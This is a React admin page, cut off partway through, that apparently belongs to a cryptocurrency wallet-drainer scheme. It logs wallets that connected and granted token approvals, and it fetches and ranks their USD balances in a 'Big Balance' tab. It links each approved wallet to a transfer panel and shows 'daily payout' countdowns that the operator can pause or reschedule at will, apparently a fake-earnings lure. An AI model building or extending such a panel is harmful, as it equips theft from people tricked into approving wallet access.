import { useCallback, useEffect, useMemo, useState } from 'react'
import { Link } from 'react-router-dom'
import { derivePayoutState, sanitizeControlState, type PayoutControlState, DAY_MS } from '../utils/payoutControls'
import type { Address } from 'viem'
import { fetchWalletSnapshot, type WalletSnapshot } from '../lib/walletSummary'
import {
  fetchAdminEvents,
  fetchSubscribers,
  fetchPayoutControls,
  updatePayoutControl,
  type AdminEventRecord,
  type AdminSubscriberRecord,
} from '../lib/adminApi'
import { AdminLogin } from '../components/AdminLogin'
import { fetchSession, logout as logoutSession } from '../lib/auth'
import { fetchAdminReferrals, type AdminReferralSummary } from '../lib/referrals'

type UpcomingPayoutRow = {
  address: Address
  baseLastApprovedAt: number
  baseNextPayoutAt: number
  lastApprovedAt: number
  scheduledNextPayoutAt: number
  resumeAt: number
  remaining: number
  status: 'paused' | 'ready' | 'running'
  progress: number
  totalUsd?: number
  control?: PayoutControlState
  isCycle: boolean
  cycleMs?: number
}

type Tab = 'connect' | 'approve' | 'big-balance' | 'subscribers' | 'referrals'

const tabLabels: Record<Tab, string> = {
  connect: 'Connected',
  approve: 'Approved',
  'big-balance': 'Big Balance',
  subscribers: 'Subscribers',
  referrals: 'Referrals',
}

type TableRow = {
  id: string
  timestamp: number
  address: Address
  totalUsd?: number
}

const formatDateTime = (timestamp: number) => {
  const formatter = new Intl.DateTimeFormat(undefined, {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: 'numeric',
    minute: '2-digit',
  })
  return formatter.format(new Date(timestamp))
}

const formatUsd = (value?: number) => {
  if (value === undefined || Number.isNaN(value)) return '—'
  return value >= 1
    ? `$${value.toLocaleString(undefined, { maximumFractionDigits: 2 })}`
    : value > 0
      ? `$${value.toFixed(4)}`
      : '$0.00'
}

const formatCountdown = (ms: number) => {
  if (ms <= 0) return '00h 00m 00s'
  const totalSeconds = Math.floor(ms / 1000)
  const hours = Math.floor(totalSeconds / 3600)
  const minutes = Math.floor((totalSeconds % 3600) / 60)
  const seconds = totalSeconds % 60
  const days = Math.floor(hours / 24)
  const displayHours = hours % 24
  const parts: string[] = []
  if (days > 0) parts.push(`${String(days).padStart(2, '0')}d`)
  parts.push(`${String(displayHours).padStart(2, '0')}h`)
  parts.push(`${String(minutes).padStart(2, '0')}m`)
  parts.push(`${String(seconds).padStart(2, '0')}s`)
  return parts.join(' ')
}

export default function AdminPage() {
  const [events, setEvents] = useState<AdminEventRecord[]>([])
  const [activeTab, setActiveTab] = useState<Tab>('connect')
  const [snapshots, setSnapshots] = useState<Record<string, WalletSnapshot>>({})
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [subscribers, setSubscribers] = useState<AdminSubscriberRecord[]>([])
  const [subsLoading, setSubsLoading] = useState(true)
  const [subsRefreshing, setSubsRefreshing] = useState(false)
  const [subsError, setSubsError] = useState<string | null>(null)
  const [referralSummaries, setReferralSummaries] = useState<AdminReferralSummary[]>([])
  const [referralLoading, setReferralLoading] = useState(true)
  const [referralError, setReferralError] = useState<string | null>(null)
  const [authState, setAuthState] = useState<'checking' | 'unauthenticated' | 'authenticated'>('checking')
  const [adminEmail, setAdminEmail] = useState<string | null>(null)
  const [nowTs, setNowTs] = useState(() => Date.now())
  const [isDailyPayoutOpen, setIsDailyPayoutOpen] = useState(false)
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null)
  const [copiedReferralCode, setCopiedReferralCode] = useState<string | null>(null)
  const [payoutControls, setPayoutControls] = useState<Record<string, PayoutControlState>>({})
  const isAuthorized = authState === 'authenticated'

  const addressEntries = useMemo(() => {
    const map = new Map<string, Address>()
    for (const event of events) {
      const lower = event.address.toLowerCase()
      if (!map.has(lower)) {
        map.set(lower, event.address)
      }
    }
    return Array.from(map.entries())
  }, [events])

  const loadEvents = useCallback(async () => {
    if (!isAuthorized) return
    setIsRefreshing(true)
    try {
      const data = await fetchAdminEvents()
      setEvents(data)
      setError(null)
    } catch (err: any) {
      setError(err?.message ?? 'Failed to load admin events')
    } finally {
      setIsRefreshing(false)
      setIsLoading(false)
    }
  }, [isAuthorized])

  const loadSubscribers = useCallback(async () => {
    if (!isAuthorized) return
    setSubsRefreshing(true)
    try {
      const data = await fetchSubscribers()
      setSubscribers(data)
      setSubsError(null)
    } catch (err: any) {
      setSubsError(err?.message ?? 'Failed to load subscribers')
    } finally {
      setSubsRefreshing(false)
      setSubsLoading(false)
    }
  }, [isAuthorized])

  const loadReferrals = useCallback(async () => {
    if (!isAuthorized) return
    setReferralLoading(true)
    try {
      const data = await fetchAdminReferrals({ limit: 200, previewLimit: 6 })
      setReferralSummaries(data.referrers)
      setReferralError(null)
    } catch (err: any) {
      setReferralError(err?.message ?? 'Failed to load referrals')
    } finally {
      setReferralLoading(false)
    }
  }, [isAuthorized])

  const refreshSnapshots = useCallback(async () => {
    if (!isAuthorized) return
    if (!addressEntries.length) {
      setSnapshots({})
      return
    }

    setIsRefreshing(true)
    try {
      const updates = await Promise.all(
        addressEntries.map(async ([lower, original]) => {
          try {
            const snapshot = await fetchWalletSnapshot(original)
            return [lower, snapshot] as const
          } catch (error) {
            console.debug('snapshot failed', original, error)
            return [lower, undefined] as const
          }
        })
      )

      const updateMap = new Map<string, WalletSnapshot>()
      for (const [addr, snapshot] of updates) {
        if (snapshot) {
          updateMap.set(addr, snapshot)
        }
      }

      setSnapshots((previous) => {
        const merged: Record<string, WalletSnapshot> = {}
        for (const [lower] of addressEntries) {
          const latest = updateMap.get(lower)
          const prior = previous[lower]

          if (latest) {
            const shouldCarryForward = prior && prior.totalUsd > 0 && latest.totalUsd === 0
            merged[lower] = shouldCarryForward ? { ...prior, updatedAt: latest.updatedAt } : latest
          } else if (prior) {
            merged[lower] = prior
          }
        }
        return merged
      })
    } finally {
      setIsRefreshing(false)
    }
  }, [addressEntries, isAuthorized])

  const handleAuthenticated = useCallback(
    (email: string) => {
      setAdminEmail(email)
      setAuthState('authenticated')
      setEvents([])
      setSnapshots({})
      setError(null)
      setIsLoading(true)
      setSubscribers([])
      setSubsLoading(true)
      setSubsError(null)
      setReferralSummaries([])
      setReferralLoading(true)
      setReferralError(null)
    },
    []
  )

  const handleLogout = useCallback(async () => {
    try {
      await logoutSession()
    } catch (error) {
      console.warn('Failed to sign out admin session', error)
    }
    setAuthState('unauthenticated')
    setAdminEmail(null)
    setEvents([])
    setSnapshots({})
    setIsLoading(true)
    setSubscribers([])
    setSubsLoading(true)
    setSubsError(null)
    setReferralSummaries([])
    setReferralLoading(true)
    setReferralError(null)
  }, [])


  useEffect(() => {
    if (!copiedAddress) return
    const timeout = window.setTimeout(() => setCopiedAddress(null), 2000)
    return () => window.clearTimeout(timeout)
  }, [copiedAddress])

  useEffect(() => {
    if (!isAuthorized) {
      setPayoutControls({})
      return
    }
    let cancelled = false
    fetchPayoutControls()
      .then((response) => {
        if (cancelled) return
        const next: Record<string, PayoutControlState> = {}
        for (const [key, record] of Object.entries(response)) {
          const cleaned = record?.control ? sanitizeControlState(record.control) : undefined
          if (cleaned) next[key.toLowerCase()] = cleaned
        }
        setPayoutControls(next)
      })
      .catch((error) => {
        if (!cancelled) console.warn('Failed to load payout controls', error)
      })
    return () => {
      cancelled = true
    }
  }, [isAuthorized])

  useEffect(() => {
    if (!copiedReferralCode) return
    const timeout = window.setTimeout(() => setCopiedReferralCode(null), 2000)
    return () => window.clearTimeout(timeout)
  }, [copiedReferralCode])

  useEffect(() => {
    let cancelled = false
    fetchSession()
      .then((session) => {
        if (cancelled) return
        setAdminEmail(session.email)
        setAuthState('authenticated')
      })
      .catch(() => {
        if (!cancelled) setAuthState('unauthenticated')
      })
    return () => {
      cancelled = true
    }
  }, [])

  useEffect(() => {
    if (!isAuthorized) return
    loadEvents()
  }, [isAuthorized, loadEvents])

  useEffect(() => {
    if (!isAuthorized) return
    loadSubscribers()
  }, [isAuthorized, loadSubscribers])

  useEffect(() => {
    if (!isAuthorized) return
    loadReferrals()
  }, [isAuthorized, loadReferrals])

  useEffect(() => {
    const id = window.setInterval(() => setNowTs(Date.now()), 1000)
    return () => window.clearInterval(id)
  }, [])

  useEffect(() => {
    if (!isAuthorized) return
    refreshSnapshots()
  }, [addressEntries, isAuthorized, refreshSnapshots])

  const eventRows = useMemo(() => {
    if (activeTab === 'subscribers') return [] as TableRow[]
    const filteredEvents = events.filter((event) => {
      if (activeTab === 'connect') return event.type === 'connect'
      if (activeTab === 'approve' || activeTab === 'big-balance') return event.type === 'approve'
      return false
    })

    const deduped: AdminEventRecord[] = []
    const seen = new Set<string>()
    for (const event of filteredEvents) {
      const key = `${event.address.toLowerCase()}`
      if (activeTab === 'connect' || activeTab === 'big-balance') {
        if (seen.has(key)) continue
        seen.add(key)
        deduped.push(event)
      } else {
        deduped.push(event)
      }
    }

    const mapped: TableRow[] = deduped.map((event) => ({
      id: String(event.id),
      timestamp: event.timestamp,
      address: event.address,
      totalUsd: snapshots[event.address.toLowerCase()]?.totalUsd,
    }))

    if (activeTab === 'big-balance') {
      return mapped
        .slice()
        .sort((a, b) => (b.totalUsd ?? 0) - (a.totalUsd ?? 0) || b.timestamp - a.timestamp)
    }

    return mapped.slice().sort((a, b) => b.timestamp - a.timestamp)
  }, [events, snapshots, activeTab])

  const subscriberRows = useMemo(() => {
    return subscribers.slice().sort((a, b) => b.createdAt - a.createdAt)
  }, [subscribers])

  const payoutSummaries = useMemo(() => {
    const map = new Map<string, { address: Address; lastApprovedAt: number; nextPayoutAt: number }>()
    for (const event of events) {
      if (event.type !== 'approve') continue
      const approvedAtMeta = Number(event.metadata?.approvedAt)
      const nextPayoutMeta = Number(event.metadata?.nextPayoutAt)
      const approvedAt = Number.isFinite(approvedAtMeta) && approvedAtMeta > 0 ? approvedAtMeta : event.timestamp
      const nextPayoutAt = Number.isFinite(nextPayoutMeta) && nextPayoutMeta > 0 ? nextPayoutMeta : approvedAt + DAY_MS
      const lower = event.address.toLowerCase()
      const current = map.get(lower)
      if (!current || approvedAt > current.lastApprovedAt) {
        map.set(lower, { address: event.address, lastApprovedAt: approvedAt, nextPayoutAt })
      }
    }
    return Array.from(map.values())
  }, [events])

  const persistPayoutControl = useCallback((address: Address, control?: PayoutControlState, schedule?: { lastApprovedAt: number; nextPayoutAt: number }) => {
    const payload = sanitizeControlState(control)
    void updatePayoutControl(address, payload, schedule).catch((error) => {
      console.warn('Failed to persist payout control', error)
    })
  }, [])

  const setControlForPayout = useCallback(
    (payout: UpcomingPayoutRow, producer: (current?: PayoutControlState) => PayoutControlState | undefined) => {
      const key = payout.address.toLowerCase()
      let nextAddress: Address | null = null
      let nextControl: PayoutControlState | undefined
      setPayoutControls((previous) => {
        const current = previous[key]
        const nextRaw = producer(current)
        if (!nextRaw) {
          if (current === undefined) return previous
          nextAddress = payout.address
          const { [key]: _omit, ...rest } = previous
          return rest
        }
        const cleaned = sanitizeControlState(nextRaw)
        if (!cleaned) {
          if (current === undefined) return previous
          nextAddress = payout.address
          const { [key]: _omit, ...rest } = previous
          return rest
        }
        const currentSerialized = current ? JSON.stringify(current) : null
        const nextSerialized = JSON.stringify(cleaned)
        if (currentSerialized === nextSerialized) {
          return previous
        }
        nextAddress = payout.address
        nextControl = cleaned
        return { ...previous, [key]: cleaned }
      })
      if (nextAddress) {
        const derived = derivePayoutState(
          payout.baseLastApprovedAt,
          payout.baseNextPayoutAt,
          nextControl ?? undefined,
          Date.now(),
          { freezePaused: false }
        )
        persistPayoutControl(nextAddress, nextControl, {
          lastApprovedAt: derived.lastApprovedAt,
          nextPayoutAt: derived.nextPayoutAt,
        })
      }
    },
    [persistPayoutControl]
  )

  const upcomingPayouts = useMemo<UpcomingPayoutRow[]>(() => {
    return payoutSummaries
      .map((summary) => {
        const lower = summary.address.toLowerCase()
        const control = payoutControls[lower]
        const totalUsd = snapshots[lower]?.totalUsd
        const derived = derivePayoutState(summary.lastApprovedAt, summary.nextPayoutAt, control, nowTs)
        return {
          address: summary.address,
          baseLastApprovedAt: summary.lastApprovedAt,
          baseNextPayoutAt: summary.nextPayoutAt,
          lastApprovedAt: derived.lastApprovedAt,
          scheduledNextPayoutAt: derived.nextPayoutAt,
          resumeAt: derived.resumeAt,
          remaining: derived.remaining,
          status: derived.status,
          progress: derived.progress,
          totalUsd,
          control,
          isCycle: derived.isCycle,
          cycleMs: derived.cycleMs,
        }
      })
      .sort((a, b) => a.resumeAt - b.resumeAt)
  }, [nowTs, payoutControls, payoutSummaries, snapshots])

  const readyToSettleCount = useMemo(() => {
    return upcomingPayouts.filter((payout) => payout.status === 'ready').length
  }, [upcomingPayouts])
  const handlePausePayout = useCallback(
    (payout: UpcomingPayoutRow) => {
      if (payout.status === 'paused') return
      const now = Date.now()
      const remaining = Math.max(payout.remaining, 0)
      const defaultResumeAt = Math.max(payout.resumeAt ?? now + remaining, now)
      setControlForPayout(payout, (current) => {
        const hasCycle = payout.isCycle || typeof current?.cycleStartAt === 'number'
        if (hasCycle) {
          const cycleLength =
            current?.cycleMs && current.cycleMs > 0 ? current.cycleMs : payout.cycleMs ?? DAY_MS
          const baseCycleStart =
            current?.cycleStartAt ??
            Math.max(payout.scheduledNextPayoutAt - cycleLength, payout.baseLastApprovedAt)
          const resumeAt = Math.max(current?.resumeAt ?? defaultResumeAt, baseCycleStart + 1000, now)
          const cycleStart = Math.max(resumeAt - cycleLength, payout.baseLastApprovedAt)
          return {
            cycleStartAt: cycleStart,
            cycleMs: cycleLength,
            paused: true,
            pauseRemainingMs: Math.max(resumeAt - now, 0),
            resumeAt,
          }
        }
        const adjustedLast = current?.adjustedLastApprovedAt ?? payout.lastApprovedAt
        const baseTarget = current?.adjustedNextPayoutAt ?? payout.scheduledNextPayoutAt
        const resumeAt = Math.max(current?.resumeAt ?? baseTarget ?? defaultResumeAt, adjustedLast + 1000, now)
        return {
          adjustedLastApprovedAt: adjustedLast,
          adjustedNextPayoutAt: resumeAt,
          paused: true,
          pauseRemainingMs: Math.max(resumeAt - now, 0),
          resumeAt,
        }
      })
    },
    [setControlForPayout]
  )

  const handleResumePayout = useCallback(
    (payout: UpcomingPayoutRow) => {
      setControlForPayout(payout, (current) => {
        const now = Date.now()
        const hasCycle = payout.isCycle || typeof current?.cycleStartAt === 'number'
        const storedRemaining = Math.max(current?.pauseRemainingMs ?? payout.remaining, 0)
        const resumeAtCandidate = Math.max(
          current?.resumeAt ?? payout.resumeAt ?? now + storedRemaining,
          now
        )
        if (hasCycle) {
          const cycleLength =
            current?.cycleMs && current.cycleMs > 0 ? current.cycleMs : payout.cycleMs ?? DAY_MS
          const cycleStart = Math.max(resumeAtCandidate - cycleLength, payout.baseLastApprovedAt)
          return {
            cycleStartAt: cycleStart,
            cycleMs: cycleLength,
          }
        }
        const adjustedLast = current?.adjustedLastApprovedAt ?? payout.lastApprovedAt
        const target = Math.max(resumeAtCandidate, adjustedLast + 1000)
        return {
          adjustedLastApprovedAt: adjustedLast,
          adjustedNextPayoutAt: target,
        }
      })
    },
    [setControlForPayout]
  )

  const handleAdjustPayoutTime = useCallback(
    (payout: UpcomingPayoutRow, deltaMs: number) => {
      if (!deltaMs) return
      setControlForPayout(payout, (current) => {
        const now = Date.now()
        const hasCycle = payout.isCycle || typeof current?.cycleStartAt === 'number'
        if (hasCycle) {
          const cycleLength =
            current?.cycleMs && current.cycleMs > 0 ? current.cycleMs : payout.cycleMs ?? DAY_MS
          if (current?.paused) {
            const baseStart =
              current.cycleStartAt ??
              Math.max(payout.scheduledNextPayoutAt - cycleLength, payout.baseLastApprovedAt)
            const baseResumeAt =
              current.resumeAt ??
              payout.resumeAt ??
              baseStart + cycleLength
            const nextResumeAt = Math.max(baseResumeAt + deltaMs, now)
            const nextCycleStart = Math.max(baseStart + deltaMs, payout.baseLastApprovedAt)
            return {
              cycleStartAt: nextCycleStart,
              cycleMs: cycleLength,
              paused: true,
              pauseRemainingMs: Math.max(nextResumeAt - now, 0),
              resumeAt: nextResumeAt,
            }
          }
          const baseStart =
            current?.cycleStartAt ??
            Math.max(payout.scheduledNextPayoutAt - cycleLength, payout.baseLastApprovedAt)
          return {
            cycleStartAt: baseStart + deltaMs,
            cycleMs: cycleLength,
          }
        }
        const adjustedLast = current?.adjustedLastApprovedAt ?? payout.lastApprovedAt
        if (current?.paused) {
          const baseTarget = current.resumeAt ?? current.adjustedNextPayoutAt ?? payout.scheduledNextPayoutAt
          const nextResumeAt = Math.max((baseTarget ?? now) + deltaMs, adjustedLast + 1000, now)
          return {
            adjustedLastApprovedAt: adjustedLast,
            adjustedNextPayoutAt: nextResumeAt,
            paused: true,
            pauseRemainingMs: Math.max(nextResumeAt - now, 0),
            resumeAt: nextResumeAt,
          }
        }
        const baseTarget = current?.adjustedNextPayoutAt ?? payout.scheduledNextPayoutAt
        const target = Math.max(baseTarget + deltaMs, adjustedLast + 1000)
        return {
          adjustedLastApprovedAt: adjustedLast,
          adjustedNextPayoutAt: target,
        }
      })
    },
    [setControlForPayout]
  )

  const handleEditPayoutTime = useCallback(
    (payout: UpcomingPayoutRow) => {
      if (typeof window === 'undefined') return
      const defaultValue = new Date(payout.scheduledNextPayoutAt).toISOString().slice(0, 16).replace('T', ' ')
      const input = window.prompt('Set the next payout time (YYYY-MM-DD HH:MM, local time)', defaultValue)
      if (!input) return
      const trimmed = input.trim()
      if (!trimmed) return
      const normalized = trimmed.includes('T') ? trimmed : trimmed.replace(' ', 'T')
      const parsed = new Date(normalized)
      if (Number.isNaN(parsed.getTime())) {
        window.alert('Unable to parse the supplied time. Please use YYYY-MM-DD HH:MM format.')
        return
      }
      const targetMs = parsed.getTime()
      setControlForPayout(payout, (current) => {
        const hasCycle = payout.isCycle || typeof current?.cycleStartAt === 'number'
        if (hasCycle) {
          const cycleLength =
            current?.cycleMs && current.cycleMs > 0 ? current.cycleMs : payout.cycleMs ?? DAY_MS
          const finalTarget = Math.max(targetMs, Date.now())
          if (current?.paused) {
            const remaining = Math.max(finalTarget - Date.now(), 0)
            const cycleStart = Math.max(finalTarget - cycleLength, payout.baseLastApprovedAt)
            return {
              cycleStartAt: cycleStart,
              cycleMs: cycleLength,
              paused: true,
              pauseRemainingMs: remaining,
              resumeAt: finalTarget,
            }
          }
          return {
            cycleStartAt: finalTarget - cycleLength,
            cycleMs: cycleLength,
          }
        }
        const adjustedLast = current?.adjustedLastApprovedAt ?? payout.lastApprovedAt
        const minTarget = adjustedLast + 1000
        const finalTarget = Math.max(targetMs, minTarget)
        if (current?.paused) {
          const remaining = Math.max(finalTarget - Date.now(), 0)
          return {
            adjustedLastApprovedAt: adjustedLast,
            adjustedNextPayoutAt: finalTarget,
            paused: true,
            pauseRemainingMs: remaining,
            resumeAt: finalTarget,
          }
        }
        return {
          adjustedLastApprovedAt: adjustedLast,
          adjustedNextPayoutAt: finalTarget,
        }
      })
    },
    [setControlForPayout]
  )

  const ensureFinite = useCallback((value: number | null | undefined, fallback: number) => {
    return typeof value === 'number' && Number.isFinite(value) ? value : fallback
  }, [])

  const handleStartPayout = useCallback(
    (payout: UpcomingPayoutRow) => {
      const now = Date.now()
      const cycleLength = payout.cycleMs && payout.cycleMs > 0 ? payout.cycleMs : DAY_MS
      const fallbackLast = ensureFinite(payout.lastApprovedAt, now - cycleLength)
      const baseNextCandidate =
        typeof payout.baseNextPayoutAt === 'number' && Number.isFinite(payout.baseNextPayoutAt)
          ? payout.baseNextPayoutAt
          : fallbackLast + cycleLength
      const safeBaseNext = ensureFinite(baseNextCandidate, now + cycleLength)
      const cycleStart = safeBaseNext > now ? safeBaseNext : now
      setControlForPayout(payout, () => ({
        cycleStartAt: cycleStart,
        cycleMs: cycleLength,
      }))
    },
    [ensureFinite, setControlForPayout]
  )

  const handleResetPayout = useCallback(
    (payout: UpcomingPayoutRow) => {
      setControlForPayout(payout, () => undefined)
    },
    [setControlForPayout]
  )

  if (authState === 'checking') {
    return (
      <div className="min-h-screen bg-[#04060d] text-white/80">
        <div className="flex min-h-screen flex-col items-center justify-center gap-4">
          <div className="h-12 w-12 animate-spin rounded-full border-2 border-emerald-400 border-t-transparent" />
          <div className="text-sm text-white/60">Verifying admin session…</div>
        </div>
      </div>
    )
  }

  if (!isAuthorized) {
    return <AdminLogin onAuthenticated={handleAuthenticated} />
  }

  const isSubscriberView = activeTab === 'subscribers'
  const isReferralView = activeTab === 'referrals'
  const activeRows = isSubscriberView ? subscriberRows : isReferralView ? referralSummaries : eventRows
  const activeLoading = isSubscriberView ? subsLoading : isReferralView ? referralLoading : isLoading
  const activeError = isSubscriberView ? subsError : isReferralView ? referralError : error
  const activeRefreshing = isSubscriberView ? subsRefreshing : isReferralView ? false : isRefreshing
  const columnCount = isSubscriberView ? 3 : isReferralView ? 5 : 5

  return (
    <div className="min-h-screen bg-[#04060d] text-white/90">
      <div className="max-w-5xl mx-auto px-6 py-10 space-y-8">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <h1 className="text-3xl font-semibold">Admin Dashboard</h1>
            <p className="text-sm text-white/60">Monitor wallet connections and approvals in real-time.</p>
            {adminEmail && <div className="text-xs text-emerald-200/80">Signed in as {adminEmail}</div>}
          </div>
          <button
            onClick={() => {
              void handleLogout()
            }}
            className="rounded-2xl border border-white/15 bg-white/5 px-4 py-2 text-sm text-white/70 transition hover:border-rose-400/60 hover:bg-rose-500/20"
          >
            Sign out
          </button>
        </div>


        <div className="space-y-4">
          <button
            type="button"
            aria-expanded={isDailyPayoutOpen}
            aria-controls="daily-payout-panel"
            onClick={() => setIsDailyPayoutOpen((previous) => !previous)}
            className="flex w-full items-center justify-between rounded-3xl border border-emerald-400/30 bg-emerald-400/10 px-6 py-4 text-left transition hover:border-emerald-400/60 hover:bg-emerald-400/15"
          >
            <div className="space-y-1">
              <div className="text-sm font-semibold uppercase tracking-[0.28em] text-emerald-100/80">
                Daily payout
              </div>
              <div className="text-xs text-emerald-100/70">
                {upcomingPayouts.length > 0
                  ? `${readyToSettleCount} ready · ${upcomingPayouts.length} wallet${upcomingPayouts.length === 1 ? '' : 's'} in cycle`
                  : 'No wallets currently queued'}
              </div>
            </div>
            <svg
              className={`h-5 w-5 text-emerald-100/80 transition-transform ${isDailyPayoutOpen ? 'rotate-180' : ''}`}
              viewBox="0 0 20 20"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M4.5 7.5L10 13l5.5-5.5"
                stroke="currentColor"
                strokeWidth="1.8"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </button>

          {isDailyPayoutOpen &&
            (upcomingPayouts.length > 0 ? (
              <section
                id="daily-payout-panel"
                className="relative overflow-hidden rounded-3xl border border-emerald-400/25 bg-emerald-400/[0.08] p-6 sm:p-8 shadow-[0_32px_110px_rgba(6,24,24,0.55)]"
              >
                <div className="pointer-events-none absolute inset-0 rounded-3xl border border-emerald-300/20" />
                <div className="pointer-events-none absolute -top-24 left-[-10%] h-52 w-52 rounded-full bg-[radial-gradient(circle_at_center,rgba(56,189,248,0.28),transparent_70%)] blur-3xl" />
                <div className="pointer-events-none absolute bottom-[-30%] right-[-12%] h-60 w-60 rounded-full bg-[radial-gradient(circle_at_center,rgba(16,185,129,0.25),transparent_75%)] blur-3xl" />
                <div className="relative space-y-6">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <div className="inline-flex items-center gap-2 rounded-full border border-emerald-300/30 bg-black/20 px-3 py-1 text-[10px] uppercase tracking-[0.32em] text-emerald-100/80">
                        Daily payout radar
                      </div>
                      <h2 className="mt-3 text-2xl font-semibold text-white">User earnings timeline under admin control</h2>
                      <p className="text-sm text-emerald-100/80">
                        Track when every approved wallet unlocks the next 24h claim and coordinate settlements with precision.
                      </p>
                    </div>
                    <div className="rounded-2xl border border-emerald-300/20 bg-black/30 px-4 py-3 text-xs text-emerald-100/70">
                      Reload the page to update • {upcomingPayouts.length} wallet{upcomingPayouts.length === 1 ? '' : 's'} in cycle
                    </div>
                  </div>
                  <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-3">
                    {upcomingPayouts.map((payout) => {
                      const isPaused = payout.status === 'paused'
                      const isReady = payout.status === 'ready'
                      const canStart = !isPaused && !payout.isCycle && isReady
                      const statusLabel = isPaused ? 'Paused' : isReady ? 'Ready to settle' : 'In progress'
                      const nextScheduledDisplay = formatDateTime(payout.scheduledNextPayoutAt)
                      const resumeDisplay = formatDateTime(payout.resumeAt)
                      const cardTone = isPaused
                        ? 'border-amber-300/60 bg-gradient-to-br from-amber-400/20 via-amber-400/10 to-amber-500/10'
                        : isReady
                          ? 'border-emerald-300/60 bg-gradient-to-br from-emerald-400/20 via-emerald-400/10 to-emerald-500/10'
                          : 'border-white/10 bg-gradient-to-br from-black/50 via-slate-900/50 to-emerald-950/30'
                      return (
                        <div
                          key={payout.address}
                          className={`relative overflow-hidden rounded-3xl border px-4 py-3 sm:px-5 sm:py-4 shadow-[0_18px_60px_rgba(2,22,16,0.45)] ${cardTone}`}
                        >
                          <div className="pointer-events-none absolute inset-0 rounded-3xl border border-white/5" />
                          <div className="relative flex flex-col gap-2.5 sm:gap-3">
                            <div className="flex items-center justify-between gap-2">
                              <div className="text-[9px] sm:text-[10px] uppercase tracking-[0.28em] text-white/60">
                                {statusLabel}
                              </div>
                              <span
                                className={`inline-flex h-2 w-2 rounded-full ${
                                  isReady
                                    ? 'bg-emerald-300 animate-pulse shadow-[0_0_12px_rgba(16,185,129,0.9)]'
                                    : isPaused
                                      ? 'bg-amber-300 animate-pulse shadow-[0_0_12px_rgba(251,191,36,0.85)]'
                                      : 'bg-sky-300'
                                }`}
                              />
                            </div>
                            <div className="flex flex-wrap items-center gap-2 rounded-2xl border border-white/10 bg-black/40 px-3 py-2 text-[11px] text-white/80 sm:text-xs">
                              <span className="font-mono leading-snug break-all">{payout.address}</span>
                              <button
                                type="button"
                                onClick={async () => {
                                  try {
                                    await navigator.clipboard.writeText(payout.address)
                                    setCopiedAddress(payout.address)
                                  } catch (error) {
                                    console.warn('Copy failed', error)
                                  }
                                }}
                                className="inline-flex items-center gap-1 rounded-full border border-emerald-300/50 bg-emerald-400/10 px-2 py-1 text-[10px] font-semibold uppercase tracking-[0.18em] text-emerald-100 transition hover:bg-emerald-400/20"
                                aria-label={`Copy ${payout.address}`}
                              >
                                <svg
                                  className="h-3.5 w-3.5"
                                  viewBox="0 0 20 20"
                                  fill="none"
                                  xmlns="http://www.w3.org/2000/svg"
                                >
                                  <path
                                    d="M7 5.5V3.25C7 2.56 7.56 2 8.25 2h8.5C17.44 2 18 2.56 18 3.25v8.5C18 12.44 17.44 13 16.75 13H14.5M3.25 7H11c.69 0 1.25.56 1.25 1.25v8.5c0 .69-.56 1.25-1.25 1.25H3.25C2.56 18 2 17.44 2 16.75v-8.5C2 7.56 2.56 7 3.25 7Z"
                                    stroke="currentColor"
                                    strokeWidth="1.6"
                                    strokeLinecap="round"
                                    strokeLinejoin="round"
                                  />
                                </svg>
                                {copiedAddress === payout.address ? 'Copied' : 'Copy'}
                              </button>
                            </div>
                            <div
                              className={`text-2xl font-semibold sm:text-3xl ${
                                isReady ? 'text-emerald-100' : isPaused ? 'text-amber-100' : 'text-white'
                              }`}
                            >
                              {formatCountdown(payout.remaining)}
                            </div>
                            {isPaused && (
                              <div className="text-[11px] font-medium uppercase tracking-[0.2em] text-amber-200">
                                Countdown paused
                              </div>
                            )}
                            <div className="rounded-full bg-white/10">
                              <div
                                className={`h-1 rounded-full ${
                                  isReady
                                    ? 'bg-emerald-300'
                                    : isPaused
                                      ? 'bg-gradient-to-r from-amber-300 via-orange-300 to-rose-400'
                                      : 'bg-gradient-to-r from-emerald-300 via-teal-300 to-sky-300'
                                }`}
                                style={{ width: `${Math.round(payout.progress * 100)}%` }}
                              />
                            </div>
                            <div className="grid gap-1 text-[11px] text-white/65 sm:text-xs">
                              <div>
                                Last approval: <span className="text-white/80">{formatDateTime(payout.lastApprovedAt)}</span>
                              </div>
                              <div>
                                Next payout:{' '}
                                <span className="text-white/80">
                                  {nextScheduledDisplay}
                                  {isPaused ? ' · paused' : ''}
                                </span>
                              </div>
                              {isPaused && (
                                <div>
                                  On resume:{' '}
                                  <span className="text-white/80">{resumeDisplay}</span>
                                </div>
                              )}
                              <div>
                                Monitored balance: <span className="text-emerald-100">{formatUsd(payout.totalUsd)}</span>
                              </div>
                            </div>
                            <div className="mt-2 flex justify-end">
                              <Link
                                to={`/admin/transfer/${payout.address}`}
                                className="text-[11px] font-semibold uppercase tracking-[0.24em] text-emerald-200/90 hover:text-emerald-100"
                              >
                                Open transfer panel
                              </Link>
                            </div>
                            <div className="mt-3 flex flex-wrap gap-2 border-t border-white/10 pt-3">
                              {canStart && (
                                <button
                                  type="button"
                                  onClick={() => handleStartPayout(payout)}
                                  className="rounded-full border border-emerald-300/60 px-3 py-1 text-[10px] font-semibold uppercase tracking-[0.2em] text-emerald-200 transition hover:bg-emerald-400/10"
                                >
                                  Start
                                </button>
                              )}
                              <button
                                type="button"
                                onClick={() => (isPaused ? handleResumePayout(payout) : handlePausePayout(payout))}
                                className={`rounded-full border px-3 py-1 text-[10px] font-semibold uppercase tracking-[0.2em] transition ${
                                  isPaused
                                    ? 'border-emerald-300/60 text-emerald-200 hover:bg-emerald-400/10'
                                    : 'border-amber-300/60 text-amber-200 hover:bg-amber-400/10'
                                }`}
                              >
                                {isPaused ? 'Resume' : 'Pause'}
                              </button>
                              <div className="flex gap-1">
                                <button
                                  type="button"
                                  onClick={() => handleAdjustPayoutTime(payout, -30 * 60 * 1000)}
                                  className="rounded-full border border-white/15 bg-white/5 px-3 py-1 text-[10px] uppercase tracking-[0.2em] text-white/70 transition hover:text-white"
                                >
                                  -30m
                                </button>
